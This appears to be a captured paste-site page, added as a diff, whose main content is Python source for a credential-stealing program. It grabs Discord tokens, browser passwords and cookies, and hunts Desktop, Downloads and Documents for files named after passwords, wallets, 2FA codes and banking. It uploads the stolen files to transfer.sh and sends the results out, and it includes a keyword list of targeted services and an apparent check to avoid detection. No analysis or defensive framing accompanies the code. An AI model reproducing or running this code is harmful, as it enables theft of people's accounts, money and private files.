+        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
+        a.start()
+        Threadlist.append(a)
+    for patt in discordPaths:
+        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+        a.start()
+        Threadlist.append(a)
+
+    for patt in browserPaths:
+        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
+        a.start()
+        Threadlist.append(a)
+
+    ThCokk = []
+    for patt in browserPaths:
+        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
+        a.start()
+        ThCokk.append(a)
+
+    for thread in ThCokk: thread.join()
+    DETECTED = Trust(Cookies)
+    if DETECTED == True: return
+
+    for patt in browserPaths:
+        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
+
+    for patt in PathsToZip:
+        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
+
+    for thread in Threadlist:
+        thread.join()
+    global upths
+    upths = []
+
+    for file in [&quot;wppassw.txt&quot;, &quot;wpcook.txt&quot;]:
+        upload(os.getenv(&quot;TEMP&quot;) + &quot;\\&quot; + file)
+
+def uploadToAnonfiles(path):
+    try:
+        files = { &quot;file&quot;: (path, open(path, mode='rb')) }
+        ...
+        upload = requests.post(&quot;https://transfer.sh/&quot;, files=files)
+        url = upload.text
+        return url
+    except:
+        return False
+
+def KiwiFolder(pathF, keywords):
+    global KiwiFiles
+    maxfilesperdir = 7
+    i = 0
+    listOfFile = os.listdir(pathF)
+    ffound = []
+    for file in listOfFile:
+        if not os.path.isfile(pathF + &quot;/&quot; + file): return
+        i += 1
+        if i &lt;= maxfilesperdir:
+            url = uploadToAnonfiles(pathF + &quot;/&quot; + file)
+            ffound.append([pathF + &quot;/&quot; + file, url])
+        else:
+            break
+    KiwiFiles.append([&quot;folder&quot;, pathF + &quot;/&quot;, ffound])
+
+KiwiFiles = []
+def KiwiFile(path, keywords):
+    global KiwiFiles
+    fifound = []
+    listOfFile = os.listdir(path)
+    for file in listOfFile:
+        for worf in keywords:
+            if worf in file.lower():
+                if os.path.isfile(path + &quot;/&quot; + file) and &quot;.txt&quot; in file:
+                    fifound.append([path + &quot;/&quot; + file, uploadToAnonfiles(path + &quot;/&quot; + file)])
+                    break
+                if os.path.isdir(path + &quot;/&quot; + file):
+                    target = path + &quot;/&quot; + file
+                    KiwiFolder(target, keywords)
+                    break
+
+    KiwiFiles.append([&quot;folder&quot;, path, fifound])
+
+def Kiwi():
+    user = temp.split(&quot;\AppData&quot;)[0]
+    path2search = [
+        user + &quot;/Desktop&quot;,
+        user + &quot;/Downloads&quot;,
+        user + &quot;/Documents&quot;
+    ]
+
+    key_wordsFolder = [
+        &quot;account&quot;,
+        &quot;acount&quot;,
+        &quot;passw&quot;,
+        &quot;secret&quot;
+
+    ]
+
+    key_wordsFiles = [
+        &quot;passw&quot;,
+        &quot;mdp&quot;,
+        &quot;motdepasse&quot;,
+        &quot;mot_de_passe&quot;,
+        &quot;login&quot;,
+        &quot;secret&quot;,
+        &quot;account&quot;,
+        &quot;acount&quot;,
+        &quot;paypal&quot;,
+        &quot;banque&quot;,
+        &quot;account&quot;,
+        &quot;metamask&quot;,
+        &quot;wallet&quot;,
+        &quot;crypto&quot;,
+        &quot;exodus&quot;,
+        &quot;discord&quot;,
+        &quot;2fa&quot;,
+        &quot;code&quot;,
+        &quot;memo&quot;,
+        &quot;compte&quot;,
+        &quot;token&quot;,
+        &quot;backup&quot;,
+        &quot;seecret&quot;
+        ]
+
+    wikith = []
+    for patt in path2search:
+        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
+        wikith.append(kiwi)
+    return wikith
+
+
+global keyword, cookiWords, paswWords
+
+keyword = [
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
+]
+
+
+cookiWords = []
+paswWords = []
+
+GatherAll()
+DETECTED = Trust(Cookies)
+
+if not DETECTED:
+    wikith = Kiwi()
+
+    for thread in wikith: thread.join()
+    time.sleep(0.2)
+
+    filetext = &quot;\n&quot;
+    for arg in KiwiFiles:
+        if len(arg[2]) != 0:
+            foldpath = arg[1]
+            foldlist = arg[2]
+            filetext += f&quot;• {foldpath}\n&quot;
+
+            for ffil in foldlist:
+                a = ffil[0].split(&quot;/&quot;)
+                fileanme = a[len(a)-1]
+                b = ffil[1]
+                filetext += f&quot;... [{fileanme}]({b})\n&quot;
+            filetext += &quot;\n&quot;
+    upload(&quot;kiwi&quot;, filetext)</textarea>
+</form>
+</div>
+<div class="footer">
+<h3 style="text-align: center;">
+<span>&copy; 2023 paste.fo</span><br>
+<a style="padding: 5px;" href="https://discord.vodka.fm/" target="_blank">
+<img style="width: 24px; height: 24px; padding: 3px 0px 0px 0px;" src="/assets/svg/discord.php">
+</a>
+<a style="padding: 5px;" href="https://twitter.com/paste_fo" target="_blank">
+<img style="width: 24px; height: 24px; padding: 3px 0px 0px 0px;" src="/assets/svg/twitter.php">
+</a>
+<a style="padding: 5px;" href="/cdn-cgi/l/email-protection#67170614130249010827060a0508141449030211" target="_blank">
+<img style="width: 24px; height: 24px; padding: 3px 0px 0px 0px;" src="/assets/svg/email.php">
+</a>
+<h3>
+</div> <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+            var editor = CodeMirror.fromTextArea(document.getElementById("editor"), {
+				mode: "text/plain",
+                theme: 'material-palenight',
+                inputStyle: 'textarea',
+                readOnly: true,
+                //lineWrapping: true,
+                lineNumbers: true
+            })
+
+            hyperlinkOverlay(editor);
+        </script>
+<script>(function(){var js = "window['__CF$cv$params']={r:'7a4eabd8cd3654e2',m:'3nX3puFFJp7rMu0pRTfrOBuXNr.STazOvjUjiM.LXl0-1678316184-0-AZmYw6X2IiW5xpY3fRCPLnaGZtNziRHptvEpEvDBlIxu9GxPPrfynnwVFLnfJa9VN6B81B3QrBSeNsLThL5vdLLuuLU4ahp7JQuWLfI1gQhxaYZDbNvF3/HRCgYQF9cwWA==',s:[0x2c15d9282f,0xff57e3ba53],u:'/cdn-cgi/challenge-platform/h/g'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/g/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vaafb692b2aea4879b33c060e79fe94621666317369993" integrity="sha512-0ahDYl866UMhKuYcW078ScMalXqtFJggm7TmlUtp0UlD4eQk0Ixfnm5ykXKvGJNFjLMoortdseTfsRT8oCfgGA==" data-cf-beacon='{"rayId":"7a4eabd8cd3654e2","version":"2023.2.0","r":1,"token":"3068ea203f9d49f39cce28355b89182b","si":100}' crossorigin="anonymous"></script>
+</body>
+</html>
